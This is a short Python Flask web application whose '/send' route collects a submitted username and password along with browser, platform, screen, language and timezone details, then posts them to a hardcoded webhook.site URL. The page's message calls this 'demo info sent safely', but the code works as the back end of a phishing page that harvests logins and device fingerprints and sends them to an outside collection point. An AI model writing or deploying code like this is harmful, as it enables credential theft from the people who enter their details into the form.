from flask import Flask, request, render_template
import requests

app = Flask(__name__)

WEBHOOK_URL = "https://webhook.site/9262c2f0-605c-4c7a-8d50-63bc42b7133e"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/send', methods=['POST'])
def send():
    data = {
        "username": request.form['username'],
        "password": request.form['password'],
        "browser": request.form['browser'],
        "platform": request.form['platform'],
        "screen": request.form['screen'],
        "language": request.form['language'],
        "timezone": request.form['timezone']
    }
    requests.post(WEBHOOK_URL, json={"content": str(data)})
    return "<h2>Demo info sent safely to webhook!</h2><p>Check your webhook.site panel.</p>"

if __name__ == "__main__":
    app.run(debug=True)